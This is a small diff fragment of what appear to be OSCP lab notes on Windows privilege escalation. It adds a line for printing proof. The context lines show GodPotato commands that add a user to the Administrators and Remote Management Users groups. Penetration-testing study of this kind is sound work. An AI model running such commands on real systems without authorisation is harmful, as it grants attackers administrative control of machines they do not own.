@@ -41,6 +41,9 @@ Example of privilege escalation in oscp-relia:
 .\GodPotato-NET4.exe  -cmd "net localgroup Administrators lala /add"
 .\GodPotato-NET4.exe  -cmd "net localgroup "Remote Management Users" lala /add"
 
+# To print the whoami proof we can print
+echo %USERPROFILE%
+
 
 ```
 
